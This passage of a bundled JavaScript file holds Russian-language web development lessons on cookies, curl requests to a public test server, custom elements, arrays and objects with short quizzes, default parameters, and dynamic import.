куки-файл можно указывать \"срок годности\" записи\n\nДля этого существует опция **~expires~**\n\nПо истечении этого срока запись будет удалена из куки-файла\n\nУказывать срок годности нужно в формате  **UTC**\n\nДля преобразования даты в формат  **UTC**  нужно использовать метод  ~toUTCString()~\n\nЕсли опция ~expires~ отсутствует или ее значение равно 0, то соответствующая запись в cookie-файле будет рассматриваться как сессионная и будет удалена при закрытии окна браузера\n\n\n![ico-25 cap] ** 5**\n\nНапример, если мы хотим, чтобы запись в куки-файле была удалена через 10 секунд после вставки,\n\n~~~js\nvar d = new Date(new Date().getTime() + 10 * 1000).toUTCString()\n~~~\n\nи после этого добавим запись в куки-файл c указанием срока годности\n\nи выведем в консоль содержимое куки-файла с помощью функции getCookies ():\n\n~~~js\ndocument.cookie = 'name=Ирина; expires='' + d\ngetCookies()\n~~~\n\nв наш куки-файл была добавлена запись ~\"name=Ирина\"~\n\nПо истечении 10 секунд еще раз вызовем функцию **_getCookies()_**:\n\n~~~js\ngetCookies()\n~~~\n\nВставленной нами записи уже нет\n\n______________________________\n\n### ![ico-20 icon] UTC\n\n**Coordinated Universal Time** - всемирный стандарт времени, не зависящий от временных зон\n\n(«Скоординированное всеобщее время»)\n\nРезультат синхронизации временных шкал всемирными Центрами времени\n\nМетод ~getTime()~  всегда возвращает время в формате **UTC**\n\n_______________________\n\n### ![ico-20 icon] Удаление куки\n\nДля удаления куки нужно \"сбросить\" значение \"срока годности\":\n\n~~~js\ndocument.cookie = 'name=; expires=' + new Date(0).toUTCString()\n~~~\n\n![ico-20 warn] Важно указать идентификатор записи, значение роли не играет\n\nУстанавливая  ~expires~  записи заведомо прошедшим значением, мы вызываем удаление записи с данным идентификатором\n"},68360:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-50 study] curl\n\nУтилита командной строки для передачи данных по URL\n\n[![ico-50 curl]](https://curl.se/docs/tutorial.html)\n\nСинтаксис:\n\n••![ico-25 bash] $ curl опции ссылка••\n\n_______________________\n\n## ![ico-25 icon] Получение данных по url\n\nПо умолчанию содержимое запрошенного ресурса будет отправлено на стандартный вывод\n\n••![ico-25 bash] $ curl https://github.com••\n\n![](illustrations/curl-01.png)\n\n\n••![ico-25 bash] $ curl https://garevna.github.io/js-samples/js/index08.js••\n\n![](illustrations/curl-02.png)\n\n\n## ![ico-25 icon] Опции\n\n^^^[-O]\n\nСохранить загруженный файл в текущую папку под тем же именем, что и на сервере\n\n••![ico-25 bash] $ curl  -O  https://garevna.github.io/js-samples/js/index08.js••\n\n![](illustrations/curl-03.png)\n\nПосле выполнения этой операции в текущей папке появится новый файл  ~index08.js~\n\n![](illustrations/curl-04.png)\n\n^^^\n\n^^^[-o]\n\nСохранить загруженный файл в текущую папку под указанным именем\n\n••![ico-25 bash] $ curl  -o  index-1.html  https://garevna.github.io/js-samples/index.html••\n\n![](illustrations/curl-05.png)\n\nПосле выполнения этой операции в текущей папке появится новый файл ~index-1.html~\n\n![](illustrations/curl-06.png)\n\n^^^\n\nДалее воспользуемся тестовым сервером ~http://httpbin.org~\nдля изучения работы ~curl~ с различными опциями\n\n__________________\n\n^^^[-d]\n\nЭта опция нужна для отправки данных на сервер методом ~POST~\n\n••![ico-25 bash] $ curl -d  \"name=garevna&subject=testing\"  http://httpbin.org/post••\n\n![](illustrations/curl-07.png)\n\nОбратите внимание на заголовки (Headers)\n\n••\"Content-Type\": \"application/x-www-form-urlencoded\"••\n\nМы отправили данные формы как пары  ключ=значение, соединенные знаком ** &**:\n\n••\"name=garevna&subject=testing\"••\n\nСервер автоматически распознал тип контента и установил значение заголовка ~Content-Type~\n\n^^^\n\n^^^[-H]\n\nЭта опция позволяет устанавливать заголовки запроса\n\nНапример, мы можем передать в [POST](external/mdn-post)-запросе информацию о типе передаваемого контента\n\nЗаголовком по умолчанию для простого POST-запроса будет\n\n••Content-Type: application / x-www-form-urlencoded••\n\nИзменим это значение\n\nУкажем, что мы передаем данные в ~json~-формате:\n\n••![ico-25 bash] $ curl -d '{ name:Irina }'  -H  'Content-Type: application/json'  http://httpbin.org/post••\n\nмы передали простой объект ~{ name:Irina }~\nв заголовке ~Content-Type: application/json~\nмы указали, что данные передаются в формате ~json~-строки\n\n![](illustrations/curl-08.png)\n\n________________________\n\nОтправим существующий файл **_index.html_** на сервер,\n\nуказав в заголовке ~Content-Type~, что мы отправляем обычный текстовый файл (~text/plain~):\n\n••![ico-25 bash] curl -d @index.html -H 'Content-Type: text/plain' http://httpbin.org/post••\n\n![](illustrations/curl-09.png)\n\n^^^\n\n^^^[-u]\n\nДля авторизации запроса на сервере нужно передать с запросом имя пользователя и пароль.\n\n~curl~ поддерживает login и пароль в URL-адресах:\n\n••![ico-25 bash] $ curl http://name:passwd@machine.domain/full/path/to/file••\n\nС помощью опции **~-u~** (**~--user~**) можно передать ~логин:пароль~ отдельно:\n\n••![ico-25 bash] $ curl --user garevna:garevna -d @index.html -H 'Content-Type: text/plain' http://httpbin.org/post••\n\n^^^\n"},56471:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Custom elements\n\nСоздание кастомных элементов DOM\n![ico-20 warn] Имена кастомных тегов обязательно должны состоять минимум из двух частей, разделенных дефисом, например:\n\n~~~html\n<speaking-club></speaking-club>\n<gold-prize></gold-prize>\n<mystery-man></mystery-man>\n~~~\n\n## ![ico-25 icon] HTMLUnknownElement\n\nЕсли просто вставить на страницу тег с отфанарным именем:\n\n~~~html\n<protuberance></protuberance>\n~~~\n\nто свойство ~__proto__~ такого элемента будет  **_~HTMLUnknownElement~_**\n\n~~~js\nconsole.dir(document.querySelector('protuberance').__proto__)\n~~~\n\n~~~console\n► HTMLUnknownElement\n~~~\n\nА вот прототипом **_~HTMLUnknownElement~_** будет уже известный нам **~HTMLElement~**\n\n~~~js\nconsole.dir(HTMLUnknownElement)\n~~~\n\n~~~console\nƒ HTMLUnknownElement()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"HTMLUnknownElement\"\n    prototype: HTMLUnknownElement {constructor: ƒ, Symbol(Symbol.toStringTag): \"HTMLUnknownElement\"}\n    __proto__: ƒ HTMLElement()\n~~~\n\nПоэтому элемент _protuberance_ унаследует все свойства и методы, которые мы обнаружим в свойстве ~prototype~ конструктора _HTMLElement_\n\n^^Однако никаких \"специфических\" свойств и методов у этого элемента не будет, что полностью нивелирует \"ценность\" подобного творения^^\n\n![ico-20 warn] При создании класса пользовательских элементов в качестве родительского класса (**super**) можно  использовать HTMLElement\nТогда создаваемый нами элемент будет наследовать свойства и методы родительского класса _HTMLElement.prototype_\n\n## ![ico-25 icon] customElements\n\nСвойство **~customElements~** (_read-only_) глобального объекта ~Window~ содержит ссылку на объект **~CustomElementRegistry~**\n\n~~~js\nconsole.dir(customElements)\n~~~\n\n~~~console\n▼ CustomElementRegistry\n  ▼ __proto__: CustomElementRegistry\n      ► define: ƒ define()\n      ► get: ƒ ()\n      ► upgrade: ƒ upgrade()\n      ► whenDefined: ƒ whenDefined()\n      ► constructor: ƒ CustomElementRegistry()\n        Symbol(Symbol.toStringTag): \"CustomElementRegistry\"\n      ► __proto__: Object\n~~~\n\nМожно посмотреть, чьим \"наследником\" является **~customElements~**\n\n~~~js\nconsole.dir(CustomElementRegistry)\n~~~\n\n~~~~console\n▼ ƒ CustomElementRegistry()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"CustomElementRegistry\"\n  ▼ prototype: CustomElementRegistry\n      ► define: ƒ define()\n      ► get: ƒ ()\n      ► upgrade: ƒ upgrade()\n      ► whenDefined: ƒ whenDefined()\n      ► constructor: ƒ CustomElementRegistry()\n        Symbol(Symbol.toStringTag): \"CustomElementRegistry\"\n      ► __proto__: Object\n  ► __proto__: ƒ ()\n~~~~\n\nМы будем использовать **~CustomElementRegistry~** для регистрации собственных (кастомных) элементов, а так же для получения информации об уже зарегистрированных элементах\n\n______________________________________________\n\n## ![ico-25 icon] customElements.define()\n\nМетод  **~define~** глобального объекта **customElements** имеет два обязательных параметра:\n\n• первый - это имя тега для регистрируемого элемента\n• второй - ссылка на класс создаваемого элемента\n\n~~~js\ncustomElements.define('sample-custom-element', SampleCustomElement)\n~~~\n\n_______________________________________\n\n### ![ico-25 icon] Пример 1\n\n^^Объявим класс **SampleElement**, расширяющий класс HTMLElement^^\n\n~~~~js\nclass SampleElement extends HTMLElement {\n  constructor() {\n    super ()\n    const wrapper = document.createElement('div')\n    wrapper.className = 'wrapper'\n    this.picture = document.createElement('img')\n    this.setPicture('https://images.pexels.com/photos/33044/sunflower-sun-summer-yellow.jpg')\n    wrapper.appendChild(this.picture)\n    this.picture.angle = 0\n    this.button = document.createElement('button')\n    this.button.innerText = 'ROTATE'\n    this.button.onclick = this.rotatePicture.bind(this)\n    wrapper.appendChild(this.button)\n\n    const style = document.createElement('style')\n    style.textContent = `\n      .wrapper {\n        background-color: #ddddee;\n      }\n      img {\n        width:200px;\n        margin: 20%;\n        border: dotted 1px #555;\n        transition: all 1s;\n      }\n    `\n\n    this.shadow = this.attachShadow({ mode: 'open' })\n    this.shadow.appendChild(style)\n    this.shadow.appendChild(wrapper)\n  }\n\n  setPicture(url) {\n    this.picture.src = url\n  }\n\n  rotatePicture () {\n    this.picture.angle += this.picture.angle < 270 ? 90 : -270\n    this.picture.style.transform = `rotate(${this.picture.angle}deg)`\n  }\n}\n~~~~\n\n^^Зарегистрируем новый элемент класса _SampleElement_^^\n\n~~~js\ncustomElements.define('sample-element', SampleElement)\n~~~\n\n^^Проверим, был ли зарегистрирован наш элемент в ~CustomElementRegistry~^^\n\n~~~js\ncustomElements.get('sample-element')\n~~~\n\n~~~console\nclass SampleElement extends HTMLElement {\n    constructor() {\n        super ()\n        let wrapper = document.createElement ( 'div' )\n        wrapper.className = \"wrapper\"\n        this.picture = document.c…\n~~~\n\n^^Вставим новый элемент на страницу^^\n\n~~~javascript\nconst elem = document.body\n  .appendChild(document.createElement('sample-element'))\n~~~\n\n________________________________________________\n\n### ![ico-25 icon] Пример 2\n\n~~~~js\nclass SampleCustomElement extends HTMLElement {\n  constructor () {\n    super ()\n    const wrapper = document.createElement('div')\n    wrapper.className = 'wrapper'\n    this.canvas = document.createElement('canvas')\n    wrapper.appendChild(this.canvas)\n    this.resizeCanvas()\n    this.area = this.canvas.getContext('2d')\n    this.shadow = this.attachShadow({ mode: 'open' })\n    const style = document.createElement('style')\n    style.textContent = `\n      .wrapper {\n        background-color: #ddddee;\n      }\n      canvas {\n        border: dotted 1px #555;\n      }\n    `\n    this.shadow.appendChild(style)\n    this.shadow.appendChild(wrapper)\n  }\n\n  resizeCanvas (event) {\n    this.canvas.width = window.innerWidth - 20\n    this.canvas.height = window.innerHeight - 20\n  }\n\n  drawLine (first, second, border) {\n    this.area.strokeStyle = border && border.lineColor\n      ? border.lineColor\n      : '#0000ff'\n    this.area.lineWidth = border && border.lineWidth\n      ? border.lineWidth\n      : 3\n    this.area.beginPath()\n    this.area.moveTo(first.x, first.y)\n    this.area.lineTo(second.x, second.y)\n    this.area.stroke()\n  }\n}\n\ncustomElements.define('sample-custom-element', SampleCustomElement)\n\nconst elem = document.body\n  .appendChild(document.createElement('sample-custom-element'))\n\nwindow.onresize = elem.resizeCanvas.bind(elem)\n\nelem.drawLine({ x:20, y:20 }, { x:400, y:200 }, { lineColor: '#008595', lineWidth: 5 })\n~~~~\n\n### ![ico-25 icon] Пример 3\n\n~~~html\n<h3>Пример использования Custom Elements</h3>\n<article contenteditable = true>\n  <p>Статические методы класса объявляются с помощью ключевого слова <b>static</b></p>\n  <p>Эти методы недоступны из экземпляров класса</p>\n  <p>Они могут быть вызваны только как методы класса</p>\n  <words-counter></words-counter>\n</article>\n~~~\n\n~~~~js\nclass WordsCounter extends HTMLElement {\n  constructor () {\n    super()\n    const textContainer = this.parentNode\n    const shadow = this.attachShadow({ mode: 'open' })\n\n    const style = Object.assign(document.createElement('style'), {\n      textContent: `\n        span {\n          background-color: #ddddee;\n          display: inline-block;\n          padding: 5px 10px;\n          color: #578;\n          border: \"1px solid #578\";\n        }\n        `\n    })\n\n    shadow.appendChild(style)\n\n    function countWords (node) {\n      const text = node.innerText || node.textContent\n      return text.split(/\\s+/g).length\n    }\n\n    const counterElem = Object.assign(document.createElement('span'), {\n      textContent: `Words: ${countWords(textContainer)}`\n    })\n\n    shadow.appendChild(counterElem)\n\n    setInterval(() => Object.assign(counterElem, {\n      textContent: `Words: ${countWords(textContainer)}`\n    }), 200)\n  }\n}\ncustomElements.define('words-counter', WordsCounter)\n~~~~\n__________________________________________________\n\n### ![ico-25 icon] Пример 4\n\n~~~~js\nclass SampleCustomElement extends HTMLElement {\n  constructor () {\n    super ()\n\n    const wrapper = Object.assign(document.createElement('div'), {\n      className: 'wrapper'\n    })\n\n    this.canvas = wrapper\n      .appendChild(Object.assign(document.createElement('canvas'), {\n        self: this,\n        history: [],\n        onmousemove: function (event) {\n          const point = { x: event.clientX, y: event.clientY }\n          this.self.drawLine(point, { lineColor: '#f0f', lineWidth: 3 })\n        }\n      }))\n\n    this.resizeCanvas()\n\n    this.area = this.canvas.getContext('2d')\n\n    this.shadow = this.attachShadow({ mode: 'open' })\n    const style = Object.assign(document.createElement('style'), {\n      textContent: `\n        .wrapper {\n          background-color: #ddddee;\n        }\n        canvas {\n          border: dotted 1px #555;\n        }\n        `\n    })\n\n    this.shadow.appendChild(style)\n    this.shadow.appendChild(wrapper)\n  }\n\n  resizeCanvas (event) {\n    Object.assign(this.canvas, {\n      width: window.innerWidth - 20,\n      height: window.innerHeight - 20\n    })\n  }\n\n  drawLine (point, border) {\n    if (!point || !point.x || !point.y) return\n\n    this.canvas.history.push(point)\n\n    const len = this.canvas.history.length\n    if (len < 2)  return\n\n    const prev = this.canvas.history[len - 2]\n    this.area.strokeStyle = border && border.lineColor\n      ? border.lineColor\n      : '#0000ff'\n\n    this.area.lineWidth = border && border.lineWidth\n      ? border.lineWidth\n      : 3\n\n    this.area.beginPath()\n    this.area.moveTo(prev.x, prev.y)\n    this.area.lineTo(point.x, point.y)\n    this.area.stroke()\n  }\n}\n\ncustomElements.define('sample-custom-element', SampleCustomElement)\n\nconst elem = document.body\n  .appendChild(document.createElement('sample-custom-element'))\n\nwindow.onresize = elem.resizeCanvas.bind(elem)\n~~~~\n"},94397:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Структуры данных\n\nВообще говоря, теперь мы с вами приступаем к изучению **ссылочного типа данных**.\nПопробуем разобраться, что же это такое.\n\nВо-первых, когда мы говорим о каких-либо **структурах данных**, мы подразумеваем некий набор данных, собранных под одним именем.\nНапример, список студентов группы или список учеников класса является структурой данных, потому что содержит десятки строковых значений (переменных типа 'string').\nОднако если вы просите список студентов группы, вы не будете перечислять содержимое списка, тем более, что вы можете и не знать его. Вы назовете шифр группы.\nТак получается структура данных.\nИмя одно, а данных, хранящихся под этим именем, может быть очень много.\n\nПочему такие типы данных являются **ссылочными**?\n\nПотому, что если вы передаете название структуры данных, то вы не передаете при этом ее содержание.\nВы передаете только **ссылку** на структуру данных.\n\nЕсли мы будем передавать эту ссылку из одной переменной в другую, мы будем передавать не группу, а **ссылку** на нее.\n\nНапример, у вас есть некая структура данных (например, список студентов группы), ссылка на которую хранится в переменной **~group~**.\n\nПосле выполнения присваивания:\n\n~~~js\nvar students = group\n~~~\n\nв переменной **~students~** будет ссылка на ту же самую структуру данных.\nНового структуры данных при этом не создается, передается только **ссылка**.\n\n@@@@\n![](illustrations/reference-is-a-lockpick-ru.svg)\nЕсли у вас есть ссылка на структуру данных, вы получаете доступ к содержимому этой структуры данных по ссылке.<br>\n@@@@\n\nДавайте познакомимся ближе со структурами данных в JS. По крайней мере, с двумя из них - массивами и объектами.\nОни отличаются по способу организации доступа к элементам структуры данных.\nВ массивах элементы строго выстроены по порядку, и доступ к ним осуществляется по их порядковому номеру внутри коллекции.\nВ объектах нет строго порядка следования, и вместо порядкового номера элементы такой коллекции (структуры) имеют уникальные идентификаторы, по которым мы можем найти их в коллекции.\n\n_________________________________________________\n\n## ![ico-30 icon] Массивы\n\n**тип данных: ~object~**\n\n• Массив - это упорядоченный набор переменных.\n• Каждая переменная называется **элементом массива**.\n• Элементы массива имеют порядковый номер (**_индекс_** элемента массива).\n\n![ico-20 warn] Индексация элементов массива начинается с нуля, т.е. первый элемент массива будет иметь индекс ~ 0~.\n\nОбъявить массив очень просто:\n\n~~~js\nvar array = [3.14, false, 'mother', null, undefined]\n~~~\n\nТо, что вы видите в правой части оператора присваивания - это **выражение**.\nПрежде, чем выполнить присваивание, движок всегда вычисляет выражение в правой части оператора присваивания.\nА в правой части оператора присваивания движок видит квадратные скобки с перечислением через запятую значений внутри квадратных скобок.\nДвижок понимает, что мы хотим создать массив, и создает массив (точнее, он вызвает для этого специальный конструктор, но об этом мы поговрим позже).\nГде движок разместил созданную структуру данных (массив) - мы никогда не узнаем, потому что нам он вернул только **ссылку** на этот массив.\nИменно эта ссылка помещена в переменную **~array~**.\n![ico-25 warn] Не массив, а **ссылка** на массив.\n\nТеперь доступ к содержимому массива осуществляется следующим образом:\n\n~~~js\narray[2]\n~~~\n\nт.е. мы используем для этого имя массива, после которого указываем **индекс** элемента в квадратных скобках.\nИндекс - это порядковый номер, начиная с нуля:\n\n| 0    | 1     | 2        | 3    | 4         |\n| 3.14 | false | 'mother' | null | undefined |\n\nВ результате получаем значение элемента массива:\n\n~~~console\n'mother'\n~~~\n\nМы имеем доступ к элементам массива не только для чтения.\nСледующее присваивание изменит значение последнего элемента массива:\n\n~~~js\narray[4] = 'father'\n~~~\n\nПосле этого присваивания наш массив будет таким:\n\n~~~console\n► (5) [3.14, false, 'mother', null, 'father']\n~~~\n\n___________________________________\n\nЕсли теперь мы выполним следующее присваивание:\n\n~~~js\nvar collection = array\n~~~\n\nто в переменной **~collection~** будет ссылка на тот же самый массив.\n\nПроверим?\n\nДавайте изменим элемент массива **~collection~**:\n\n~~~js\ncollection[3] = 'brother'\n~~~\n\nи посмотрим на массив **~array~**:\n\n~~~js\narray\n~~~\n\n~~~console\n► (5) [3.14, false, 'mother', 'brother', 'father']\n~~~\n\nКак видите, изменения, которые мы внесли (по ссылке!) в массив **~collection~**, отобразились в массиве **~array~**.\nЭто происходит потому, что и переменная **~collection~**, и переменная **~array~** являются **ссылками на один и тот же массив**.\n\n### ![ico-25 icon] length\n\nУ массивов, как и у строк, есть свойство **~length~** (длина массива, или число элементов массива).\n\nДосту к этому свойству возможен в **точечной нотации** (через точку после имени массива):\n\n~~~js\ncollection.length\n~~~\n\n~~~console\n5\n~~~\n\n_________________________________________\n\n### ![ico-25 hw] Tests\n\n◘◘![ico-20 hw] 1◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\n~~~\n\n→→→ students[1] | 'Piter', 'Madelin', 'Gregory', null, undefinded | Madelin →→→\n\n◘◘![ico-20 hw] 2◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\n~~~\n\n→→→ students[3] | 'Piter', 'Madelin', 'Gregory', null, undefinded | undefinded →→→\n\n◘◘![ico-20 hw] 3◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = students\ngroup[3] = 'Frodo'\n~~~\n\n→→→ students[3] | 'Piter', 'Madelin', 'Gregory', 'Frodo', null, undefinded | Frodo →→→\n\n◘◘![ico-20 hw] 4◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = []\ngroup[3] = students[0]\n~~~\n\n→→→ group.length | 0, 1, 2, 3, 4, undefinded | 4 →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = []\ngroup[0] = students\n~~~\n\n→→→ group.length | 0, 1, 2, 3 | 1→→→\n\n◘◘![ico-20 hw] 6◘◘\n\n~~~js\nvar  students = ['Frodo', 'Stephan', 'Madelin', 'Helen']\nvar hello = 'Hi ' + students[1] + '!'\n~~~\n\n→→→ hello | 'Hi !', 'Hi Frodo!', 'Hi Stephan!', 'Hi Madelin!', 'Hi Helen!' | Hi Stephan!→→→\n\n_____________________________________________________________\n\n## ![ico-25 icon] Объекты\n\n**тип данных: ~object~**\n\nЕсли массивы мы создавали с помощью квадратных скобок, то для создания объектов мы будем использовать фигурные скобки ~{}~.\nСодержимое массива мы перечисляли внутри квадратных скобок через запятую.\nИндексы элементов в массиве определялись автоматически на основании порядка их следования при перечислении.\nСодержимое объекта будет так же перечисляться через запятую, но есть нюанс: **объект не является упорядоченным набором элементов**.\nДанные, которые будут храниться в объекте, не будут иметь индексов, а вместо индексов мы будем использовать ключи, т.е. текстовые строки (тип 'string').\nИ если данные в массиве мы называли **элементами массива**, то данные в объекте мы будем называть **свойствами объекта**.\nКаждое свойство объекта имеет **имя** и **значение**.\n\nВот так определяется объект **~human~** с тремя свойствами: **~name~**, **~age~** и **~employed~**:\n\n◘◘![ico-25 cap] 5◘◘\n\n~~~js\nvar human = {\n  name: 'Frodo',\n  age: 35,\n  employed: true\n}\n~~~\n\nЧтобы движок понял вас правильно, перечисляемые свойства объекта внутри фигурных скобок должны быть выражением ~имя: значение~.\n\nИмя свойства является **ключом** для доступа к значению свойства, так же, как индекс элемента массива является ключом для доступа к элементу массива.\nМы можем использовать **точечную нотацию** для доступа к своствам объекта:\n\n~~~js\nhuman.name\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nОднако можно так же использовать нотацию квадратных скобок, как у массивов, только вместо целочисленных индесов внутри квадратных скобок указываются ключи, т.е. строки:\n\n~~~js\nhuman['name']\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nПочему такая нотация бывает удобнее точечной?\n\nПредположим, что имя ключа у нас находится в переменной:\n\n~~~js\nvar propName = 'name'\n~~~\n\nТогда мы можем получить значение свойства объекта по ключу, хранящемуся в переменной **~propName~**:\n\n~~~js\nhuman[propName]\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nМы достаточно легко можем добавлять свойства объекту обычным присваиванием:\n\n~~~js\nhuman.hobby = ['sport', 'reading']\n~~~\n\nПосле такого присваивания объект **~human~** в консоли будет выглядеть следующим образом:\n\n~~~console\n▼ {name: 'Frodo', age: 35, employed: true, hobby: Array(2)}\n    age: 35\n    employed: true\n    hobby: (2) ['sport', 'reading']\n    name: \"Frodo\"\n  ► [[Prototype]]: Object\n~~~\n\nПозже мы с вами узнаем, что это за свойство ~[[Prototype]]: Object~, которого мы с вами не добавляли объекту, но которое будет присутствовать в любом объекте.\n\nДля удаления свойств нужно использовать оператор **~delete~**:\n\n~~~js\ndelete human.hobby\n~~~\n\nЭтот оператор применим только к свойствам объекта, и возвращает логическое значение ~true~ или ~false~ в засисимости от того, произошло удаление или нет.\n\n________________________________________________________\n\n### ![ico-25 hw] Tests\n\n◘◘![ico-20 hw] 1◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', [0, 1]]\n~~~\n\n→→→ typeof memo[4] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 2◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', { name: 'Figaro' }]\n~~~\n\n→→→ typeof memo[4] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 3◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', { name: 'Figaro' }]\n~~~\n\n→→→ typeof memo[4].name | 'string', 'number', 'boolean', 'object', undefinded | string →→→\n\n◘◘![ico-20 hw] 4◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list[0] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list[0].name | 'string', 'number', 'boolean', 'object', undefinded | string →→→\n\n◘◘![ico-20 hw] 6◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students.group | 'Dev-05', 'Programming', 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Dev-05 →→→\n\n◘◘![ico-20 hw] 7◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students[1] | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | undefinded →→→\n\n◘◘![ico-20 hw] 8◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students.names[1] | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Helen Surmot →→→\n\n◘◘![ico-20 hw] 9◘◘\n\n~~~js\nvar  students = [\n  {\n    name: 'Piter Clark',\n    homeworks: [10, 7, 8, 5, 9, 6, 4, 8, 7]\n  },\n  {\n    name: 'Helen Surmot',\n    homeworks: [5, 4, 7, 6, 8, 7, 7, 6, 8]\n  },\n  {\n    name: 'Pavel Farios',\n    homeworks: [9, 8, 9, 10, 7, 7, 8, 6, 8]\n  },\n  {\n    name: 'Alex Figa',\n    homeworks: [4, 5, 4, 6, 7, 5, 6, 7, 8]\n  },\n  {\n    name: 'Gregory Trump',\n    homeworks: [3, 5, 4, 6, 5, 7, 6, 6, 7]\n  }\n]\n~~~\n\n→→→ students[4].name | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Gregory Trump →→→\n\n◘◘![ico-20 hw] 10◘◘\n\n~~~js\nvar  students = [\n  {\n    name: 'Piter Clark',\n    homeworks: [10, 7, 8, 5, 9, 6, 4, 8, 7]\n  },\n  {\n    name: 'Helen Surmot',\n    homeworks: [5, 4, 7, 6, 8, 7, 7, 6, 8]\n  },\n  {\n    name: 'Pavel Farios',\n    homeworks: [9, 8, 9, 10, 7, 7, 8, 6, 8]\n  },\n  {\n    name: 'Alex Figa',\n    homeworks: [4, 5, 4, 6, 7, 5, 6, 7, 8]\n  },\n  {\n    name: 'Gregory Trump',\n    homeworks: [3, 5, 4, 6, 5, 7, 6, 6, 7]\n  }\n]\n~~~\n\n→→→ students[4].homeworks[1] | 7, 10, 8, 4, 5, 9, undefinded | 5 →→→\n\n________________________________________________________\n\n[![ico-20 link] MDN](external/mdn-data-structures)\n"},66044:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Параметры функции по умолчанию\n\n**ES6**\n\n![ico-20 require] В ES6 появилась возможность указывать в сигнатуре функции значения параметров по умолчанию:\n\n![ico-25 cap] ** 1 **\n\n~~~js\nvar display = function (name = 'user', text = 'welcome') {\n  return  text + ', ' + name\n}\n~~~\n\n^^При вызове функции без аргументов:^^\n\n~~~js\ndisplay()\n~~~\n\n^^возвращаемое значение будет ~\"welcome, user\"~^^\n^^При вызове функции с одним аргументом^^\n\n~~~js\ndisplay('Иван')\n~~~\n\n^^возвращаемое значение будет ~\"welcome, Иван\"~^^\n\n^^При вызове функции с двумя аргументами^^\n\n~~~js\ndisplay('Иван', 'Добро пожаловать')\n~~~\n\n^^возвращаемое значение будет ~\"Добро пожаловать, Иван\"~^^\n\n^^При вызове функции:^^\n\n~~~js\ndisplay(null, 'Добро пожаловать')\n~~~\n\n^^возвращаемое значение будет ~\"Добро пожаловать, user\"~^^\n\n^^т.е. если аргумент не был передан при вызове функции, или передано значение ~undefined~ (что, по сути, одно и то же), то будет использовано значение по умолчанию^^\n\n![ico-20 warn] Можно не только присваивать значения по умолчанию, но и вычислять их динамически:\n\n![ico-25 cap] ** 2 **\n\n~~~js\nvar calcs = function (x = 1, y = x + 1, z = x + y) {\n  console.log (x, y, z)\n}\n\ncalcs()              //  1 2 3\ncalcs(2)           //  2 3 5\ncalcs(4, 8)        //  4 8 12\ncalcs(3, 1, 7)     //  3 1 7\n~~~\n"},87799:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-25 study] Dynamic import\n\n**ES 2019**\n\n__________________________________________________\n\nТеперь у нас есть выбор между статическим (**~import~**) и динамическим (**~import()~**) импортом.\n\nДинамический импорт представлен новой функцией **~import()~**, возвращающей промис.\n\n![ico-25 warn] Строго говоря, **~import()~** не является функцией в смысле наследования от **~Function~**, это вообще не объект.\n\n_________________________________\n\n![ico-30 cap] ** 1**\n\nЗапустите в консоли **Chrome** следующий код:\n\n~~~js\ndocument.body.onclick = async () => {\n  const module = await import('https://garevna.github.io/js-samples/js/index21.js')\n}\n~~~\n\n^^![ico-20 speach] Примечательно то, что в файле **_index21.js_** нет директивы **_~export~_**^^\n^^Однако импорт сработал, и скрипт запустился^^\n\n{{{dynamic-import-1.js}}}\n\n____________________________________\n\n![ico-30 cap] ** 2**\n\n^^В этом примере 